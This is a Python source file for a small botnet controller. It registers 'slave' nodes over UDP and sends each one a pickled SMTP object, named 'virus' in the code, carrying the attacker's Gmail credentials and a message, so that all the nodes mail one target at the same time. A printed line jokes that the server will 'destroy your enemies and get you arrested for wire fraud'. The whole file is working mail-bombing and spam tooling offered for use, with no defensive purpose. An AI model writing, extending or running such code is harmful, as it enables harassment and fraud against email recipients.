from socket import *
import pickle
import threading
import smtp
import time


def newSlave(server, clientAddress, info):
    """
    Threaded process that sends object, and recieves info back from the node
    """
    # todo remake in TCP so slaves can be held
    try:
        virus = smtp.SMTP(info[0], info[1], info[2], info[3], info[4], info[5])

        payload = pickle.dumps(virus)

        server.sendto(payload, clientAddress)

        message, clientAddress = server.recvfrom(2048)
        print(f"\tMessage Recieved from node : "+message.decode())
    except:
        pass

def spool(amt):
    """
    For testing purposes, spin up a specifed number of slave nodes as threads on local machine
    """
    from slaveNode import main

    for node in range(amt):
        slaves = threading.Thread(target=main)
        slaves.start()

def main():
    serverPort = 12000
    server = socket(AF_INET, SOCK_DGRAM)
    server.bind(("", serverPort))
    slaveNum = 0
    info = ["","","","","",""]
    threads = []

    amt = input("spool slaves? ")
    if amt == "":
        pass
    else:
        spool(int(amt))

    print("server starting...\n")
    run = input("run? ")
    timeout = input("server timeout: ")

    if timeout == "":
        server.settimeout(2.0)
    else:
        server.settimeout(float(timeout))

    info[0] = input("sender email: ")
    info[1] = input("receiver email: ")
    info[2] = input("sender password: ")
    info[3] = input("file path: ")
    if info[3] == "":
        info[3] = None
    info[4] = input("subject: ")
    info[5] = input("body: ")

    print('The server is ready to destroy your enemies and get you arrested for wire fraud')

    input("start server? ")
    while True:
        print("Server Listening...")
        try:
            message, clientAddress = server.recvfrom(2048)
            print(f"\tMessage Recieved from node: "+message.decode())

            threads.append(threading.Thread(target=newSlave, args=(server, clientAddress, info)))
        except:
            print(f"current slaves: {len(threads)}")
            run = input("\texecute? (y/n) ")
            if run == "y":
                for node in threads:
                    node.start()
                    #todo move away from gmail smtp, for faster sending...
                    time.sleep(0.5)
            else:
                exit = input("exit or continue listening (e/c): ")
                if exit.lower() == "c":
                    pass
                else:
                    print("exiting")
                    break
                


    server.close()

if __name__ == "__main__":
    main()
